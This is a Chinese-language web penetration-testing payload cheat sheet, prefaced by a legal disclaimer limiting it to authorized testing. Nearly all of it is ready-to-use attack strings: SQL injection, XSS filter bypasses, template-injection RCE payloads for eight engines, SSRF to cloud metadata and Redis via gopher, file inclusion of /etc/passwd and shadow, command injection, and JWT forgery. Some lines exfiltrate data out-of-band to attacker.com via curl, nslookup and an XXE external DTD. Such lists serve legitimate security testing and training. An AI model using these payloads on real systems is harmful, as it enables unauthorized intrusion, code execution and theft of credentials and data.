# Payload速查手册

> **法律声明**: 本文档仅供授权安全测试使用。未经授权使用本文档中的技术对目标系统进行测试均属违法行为。使用者须自行承担法律责任。

---

## 一、SQL注入 (SQLi)

### 基础检测
```sql
' OR 1=1--
" OR "1"="1
' OR '1'='1'--
' OR 1=1#
' OR 1=1--
' UNION SELECT NULL--
' UNION SELECT 1,2,3--
' AND 1=1--
' AND 1=2--
```

### 报错注入
```sql
' AND extractvalue(1,concat(0x7e,database()))--
' AND updatexml(1,concat(0x7e,database()),1)--
' AND (SELECT * FROM(SELECT COUNT(*),CONCAT(database(),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--
```

### 布尔盲注
```sql
' AND SUBSTRING(database(),1,1)='a'--
' AND (SELECT ASCII(SUBSTRING(database(),1,1)))>97--
```

### 时间盲注
```sql
' OR IF(1=1,SLEEP(3),0)--
' OR WAITFOR DELAY '0:0:3'--
' OR pg_sleep(3)--
```

### 联合查询
```sql
' UNION SELECT 1,2,3,4--
' UNION SELECT @@version,user(),database()--
' UNION SELECT table_name,column_name,NULL FROM information_schema.columns--
```

### 常见数据库注释符
| 数据库 | 注释符 |
|--------|--------|
| MySQL | `-- `, `#`, `/*!*/` |
| PostgreSQL | `-- `, `/* */` |
| MSSQL | `-- `, `/* */` |
| Oracle | `-- `, `/* */` |

### 常见数据库版本查询
```sql
MySQL:        @@version / version()
PostgreSQL:   version()
MSSQL:        @@version
Oracle:       SELECT banner FROM v$version
SQLite:       sqlite_version()
```

### 报错信息长度限制绕过
```sql
-- MySQL extractvalue 限制32字符，可用 SUBSTR
' AND extractvalue(1,concat(0x7e,SUBSTR((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),1,31)))--

-- 无列名注入（不知道列名时）
' UNION SELECT 1,(SELECT `2` FROM (SELECT 1,2 UNION SELECT * FROM admin)a LIMIT 1,1),3--
```

---

## 二、跨站脚本 (XSS)

### 基础payload
```html
<script>alert(1)</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<select autofocus onfocus=alert(1)>
```

### 事件处理器
```html
onerror=alert(1)
onload=alert(1)
onfocus=alert(1)
onclick=alert(1)
onmouseover=alert(1)
onchange=alert(1)
onblur=alert(1)
onscroll=alert(1)
onreset=alert(1)
onsubmit=alert(1)
```

### 绕过过滤
```html
-- 大小写混合
<ScRiPt>alert(1)</sCrIpT>

-- 双写
<scr<script>ipt>alert(1)</script>

-- 无引号
<img src=x onerror=alert(1)>

-- HTML实体编码
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

-- Unicode编码
alert(1)

-- Base64(data URI)
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">

-- javascript伪协议
<a href="javascript:alert(1)">click</a>

-- 空格/换行绕过
<img/src=x/onerror=alert(1)>
<img%0Aonerror=alert(1) src=x>
```

### 不同上下文
```js
// HTML上下文
<script>alert(1)</script>

// 属性上下文
" onfocus=alert(1) autofocus "

// URL上下文
javascript:alert(1)

// CSS上下文
background:url(javascript:alert(1));

// Angular表达式
{{constructor.constructor('alert(1)')()}}
```

### DOM型XSS特殊payload
```js
#<img src=x onerror=alert(1)>
javascript:alert(1)//
"-alert(1)-"
'+alert(1)+'
`-alert(1)-`
```

---

## 三、服务端模板注入 (SSTI)

### 检测payload
```
{{7*7}}
${7*7}
#{7*7}
*{7*7}
{{7*'7'}}
<%= 7*7 %>
${{7*7}}
{php}echo 7*7;{/php}
```

### 各模板引擎

| 引擎 | 检测 | RCE |
|------|------|-----|
| Jinja2 (Python) | `{{7*7}}` | `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` |
| Twig (PHP) | `{{7*7}}` | `{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}` |
| FreeMarker (Java) | `${7*7}` | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| Velocity (Java) | `#set($x=7*7)$x` | `#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")` |
| ERB (Ruby) | `<%= 7*7 %>` | `<%= system("id") %>` |
| Smarty (PHP) | `{7*7}` | `{system('id')}` |
| Mako (Python) | `${7*7}` | `<%import os;print os.popen('id').read()%>` |
| Jade/Pug | `#{7*7}` | `#{global.process.mainModule.require('child_process').execSync('id')}` |

---

## 四、SSRF (服务端请求伪造)

### 内网地址
```
http://127.0.0.1:80
http://127.0.0.1:8080
http://127.0.0.1:3306
http://127.0.0.1:6379
http://127.0.0.1:27017
http://localhost
http://[::1]:80
http://0.0.0.0:80
http://0:80
http://2130706433
http://0x7f000001
http://0177.0.0.1
http://0x7f.0x0.0x0.0x1
```

### 云元数据
```
AWS:       http://169.254.169.254/latest/meta-data/
GCP:       http://metadata.google.internal/computeMetadata/v1/
Azure:     http://169.254.169.254/metadata/instance?api-version=2021-02-01
AliCloud:  http://100.100.100.200/latest/meta-data/
DigitalOcean: http://169.254.169.254/metadata/v1/
```

### 其他协议
```
file:///etc/passwd
file:///proc/self/environ
file:///proc/self/cmdline
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
dict://127.0.0.1:6379/info
ftp://anonymous:anonymous@127.0.0.1:21
```

### DNS重绑定绕过
```
rbndr.us
1u.ms
xip.io
```

---

## 五、文件包含 (LFI)

### 基本路径
```
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../etc/shadow
../../../etc/hosts
../../../etc/issue
../../../proc/version
```

### PHP封装器
```
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=config.php
php://filter/convert.base64-encode/resource=../../etc/passwd
php://input (POST: <?php system('id');?>)
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOw==
expect://id
php://filter/convert.iconv.utf-8.utf-7/resource=index.php  (编码绕过)
```

### Windows路径
```
../../../windows/win.ini
../../../windows/system32/drivers/etc/hosts
../../../boot.ini
../../../windows/repair/SAM
../../../windows/php.ini
```

### Apache/Nginx日志包含
```
../../../var/log/apache2/access.log
../../../var/log/nginx/access.log
../../../var/log/httpd/access_log
/proc/self/environ
/proc/self/fd/0
/proc/self/fd/1
/proc/self/fd/2
```

### 空字节截断(仅PHP < 5.3.4)
```
../../../etc/passwd%00
../../../etc/passwd%00.php
```

### 双编码
```
..%252f..%252f..%252fetc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
```

---

## 六、目录遍历 (Directory Traversal)

```
../
..%2f
..%252f
..\;
..%5c
..%2525%355c
..%c0%af
..%25c0%25af
..%2525c0%2525af
%2e%2e%2f
%2e%2e/
..%00/
..%0d/
..\/
....//....//  (双写绕过filter)
```

---

## 七、命令注入 (Command Injection)

### Linux
```bash
; id
| id
`id`
$(id)
|| id
&& id
;cat /etc/passwd
|cat /etc/passwd
`cat /etc/passwd`
$(cat /etc/passwd)
; ls -la /
| ls -la /
```

### Windows
```cmd
; dir
| dir
`dir`
|| dir
&& dir
%0Adir
| dir c:\
& dir &
```

### 带外(OOB)数据外带
```bash
$(curl http://attacker.com/$(whoami))
`curl http://attacker.com/$(hostname)`
; nslookup `whoami`.attacker.com
| nslookup `id`.attacker.com
```

### 命令注入绕过
```bash
# 空格绕过
cat</etc/passwd
{cat,/etc/passwd}
cat$IFS/etc/passwd
cat%09/etc/passwd

# 关键字符绕过
c'a't /etc/passwd
c"a"t /etc/passwd
c\a\t /etc/passwd
/bin/cat /etc/passwd
/usr/bin/cat /etc/passwd

# Base64编码命令
echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | bash
`echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d`

# 通配符
/??t/c?? /??p*/p?????d
/usr/bin/cat /etc/pass*
```

---

## 八、开放重定向 (Open Redirect)

```
//evil.com
//evil.com@victim.com
@evil.com
\evil.com
https://evil.com
http://evil.com
javascript:alert(1)
data:text/html,<script>alert(1)</script>
//evil.com%2f@victim.com
//victim.com@evil.com
///evil.com
////evil.com
http://victim.com.evil.com
http://evil.com?http://victim.com
http://victim.com#http://evil.com  (Fragment绕过)
```

### 常见参数名
```
?url=
?next=
?redirect=
?redirect_uri=
?redirect_url=
?return=
?return_to=
?return_url=
?target=
?goto=
?link=
?view=
?loginsuccess=
?callback=
?dest=
?destination=
?out=
?view=
?domain=
```

---

## 九、XXE (XML外部实体注入)

```xml
<!-- 基本读取 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- OOB外带 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>&send;</root>

<!-- 盲注 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
  %send;
]>
<root>1</root>
```

---

## 十、文件上传绕过

### Content-Type绕过
```
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
Content-Type: application/pdf
Content-Type: text/plain
```

### 魔术字节
```
GIF89a  (GIF头部)
\x89PNG\r\n\x1a\n  (PNG头部)
\xFF\xD8\xFF\xE0  (JPEG头部)
%PDF-1.4  (PDF头部)
```

### 扩展名绕过
```
shell.php.jpg
shell.php%00.jpg
shell.php;.jpg
shell.php..jpg
shell.php_.jpg
shell.phtml
shell.pht
shell.php5
shell.php7
shell.shtml
shell.inc
shell.asp
shell.aspx
shell.jsp
shell.jspx
shell.cgi
shell.pl
shell.war
```

---

## 十一、CORS/跨域测试

```javascript
// 测试CORS配置
fetch('https://target.com/api', {credentials: 'include'})
  .then(r => r.text())
  .then(d => console.log(d))

// 自定义Origin
Origin: null
Origin: https://evil.com
Origin: https://target.com.evil.com
Origin: https://target.com
Origin: http://target.com (切换https→http)
```

---

## 十二、JWT攻击

```bash
# 算法混淆(将RS256改为HS256)
# 修改header: {"alg":"HS256"}，用公钥签名

# 空签名攻击
# 修改header: {"alg":"none"}

# 修改payload中的claim
# {"sub":"admin","role":"admin","admin":true}

# 爆破密钥
python jwt_tool.py <token> -C -d wordlist.txt
```

---

## 十三、IDOR检测

```bash
# 遍历ID
curl https://target.com/api/user/1
curl https://target.com/api/user/2
curl https://target.com/api/user/3

# 修改UUID
curl https://target.com/api/order/00000000-0000-0000-0000-000000000001
curl https://target.com/api/order/00000000-0000-0000-0000-000000000002

# 修改邮箱/用户名参数
curl -X POST https://target.com/api/reset -d 'email=victim@test.com'
curl -X POST https://target.com/api/reset -d 'email=attacker@test.com'
```

---

> **一句话心法**: Payload不用背全，知道什么场景用什么类型即可。关键是有系统的测试流程而非随机乱试。
